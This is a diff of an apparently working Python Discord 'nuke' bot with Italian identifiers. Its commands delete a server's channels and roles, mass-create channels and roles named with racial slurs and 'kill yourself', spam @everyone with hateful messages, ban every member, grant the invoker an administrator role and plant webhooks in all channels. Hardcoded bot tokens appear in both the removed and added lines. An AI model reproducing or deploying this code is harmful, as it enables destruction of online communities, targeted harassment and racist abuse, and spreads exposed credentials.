@@ -3,16 +3,15 @@ from discord.ext import commands
 from discord import Permissions
 import random
 import asyncio
-import colorama 
 from colorama import Fore
 import pyfiglet
 from pyfiglet import *
 import time
-
+from discord.utils import get
 #########################################configs###############################################
-messaggio1 = "@everyone I hate niggers"
-messaggio2 = "@everyone https://cdn.discordapp.com/attachments/1080949240597073970/1080951014804422716/twetwewey.PNG"
-messaggio3 = "@everyone server demmerda, entrate in questo https://discord.gg/EeJEXCUhv9"
+messaggio1 = "@everyone Disabili "
+messaggio2 = "@everyone https://tenor.com/view/falling-down-gif-18325821"
+messaggio3 = "@everyone https://github.com/Nigerbus/Lancelot-Nuke-Bot Provatelo, coglioni"
 lista = [messaggio1, messaggio2, messaggio3]
 ###############################################################################################
 
@@ -22,9 +21,22 @@ intents = discord.Intents.all()
 intents.message_content = True
 intents.typing = False
 intents.presences = False
+prev = []
+def alternator(k):
+    global prev
+    prev.append(k)
+    if prev[0] == k:
+        k = "Ruolo"
+        prev[0] = k
+    else:
+        prev[0] = k
+    return k
 
-TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.GVPMYw.7QxjQGqb9agGfpIt0P5xZ3G3S38zSrnYU_iIGE"
+
+
+TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.Gt6JTl.BPCtgdAZI_3V8mjxTJOAEiLZ5T3MGPxQ73VdzU"
 bot = commands.Bot(command_prefix="lancelot!", intents=intents)
+
     
 @bot.event
 async def on_ready():                                                                                                 
@@ -69,6 +81,7 @@ async def on_ready():
 
 @bot.command()
 async def maxpower(ctx):
+    
     channels = ctx.guild.channels
     guild = ctx.guild
     roles = guild.roles
@@ -94,20 +107,26 @@ async def maxpower(ctx):
     await guild.create_text_channel(name = "nuked")
     channels = ctx.guild.text_channels
     guild = ctx.guild
-    for n in range(500):
+    if len(roles) == 250:
+        num = 500
+    else:
+        num = 750
+    for n in range(num):
         try:
-            if len(roles) != 250:
-                create_channel =  guild.create_role(name = "kill yourself")
-                bot.loop.create_task(create_channel)
+            cosa = "Canale"
+            k = alternator(cosa)
+            if len(roles) != 250 and k == "Ruolo":
+                create_role =  guild.create_role(name = "kill yourself")
+                bot.loop.create_task(create_role)
                 print(Fore.WHITE + "1 Role created")
                 roles = guild.roles
-                await asyncio.sleep(1 / 45)
-            if len(channels) != 500:
-                create_role = guild.create_text_channel(name = "fucking nigger")
-                bot.loop.create_task(create_role)
+                print(len(roles))
+            if len(channels) != 500 and k == "Canale":
+                create_channel = guild.create_text_channel(name = "fucking nigger")
+                bot.loop.create_task(create_channel)
                 print(Fore.YELLOW + "1 Text Channel Created")
                 channels = guild.text_channels
-                await asyncio.sleep(1 / 45)
+            await asyncio.sleep(1 / 50)
         except:
                 break
     sent = 1
@@ -125,7 +144,8 @@ async def maxpower(ctx):
                     if sent == cap:
                         time.sleep(5)
                         cap += 1000
-                        
+
+
 @bot.command()
 async def extermine(ctx):
     members = ctx.guild.members
@@ -136,7 +156,6 @@ async def extermine(ctx):
                 print(Fore.GREEN + str(member) + "was banned")
             except:
               print(Fore.RED + str(member) + " can't be banned")
-
 
 @bot.command()
 async def deterrent(ctx):
@@ -153,24 +172,55 @@ async def deterrent(ctx):
                     blacklist.append(member)
                     continue
  
-
-                
-
-
 @bot.command()
 async def geass(ctx):
     guild = ctx.guild
     roles = guild.roles
-    if len(roles) >= 250:
-        role = discord.utils.get(guild.roles, name = "kill yourself")
-        await role.delete()
-    role = await guild.create_role(name='user', permissions=discord.Permissions(administrator=True))
     user = ctx.author
-    try:
+
+    if len(roles) == 250:
+        role = get(roles, name = "kill yourself")
+        await role.delete()
+    role = get(roles , name = "user")
+    if role:
         await user.add_roles(role)
-        print(Fore.GREEN + "role succesfully given to " + user )
-    except:
-        print(Fore.RED + "something went wrong")
+        print(Fore.GREEN + f"role succesfully given to {user}" )
+    else:
+        role = await guild.create_role(name='user', permissions=discord.Permissions(administrator=True))
+        try:
+            await user.add_roles(role)
+            print(Fore.GREEN + f"role succesfully given to {user}" )
+        except:
+            print(Fore.RED + "something went wrong")
+            raise
+
+
+@bot.command()
+async def webhook(ctx):
+    guild = ctx.guild
+    channels = guild.channels
+    for channel in channels:
+        await channel.create_webhook(name = "webhook")
+        await channel.send("Webhook created")
+
+@bot.command()
+async def equalize(ctx):
+    guild = ctx.guild
+    roles = guild.roles
+    for role in roles:
+        try:
+            delr = role.delete()
+            bot.loop.create_task(delr)
+            await asyncio.sleep(1 / 5)
+        except:
+            print("role can't be deleted")
+
+
+
+
+
+
+
 
 bot.run(TOKEN)
 
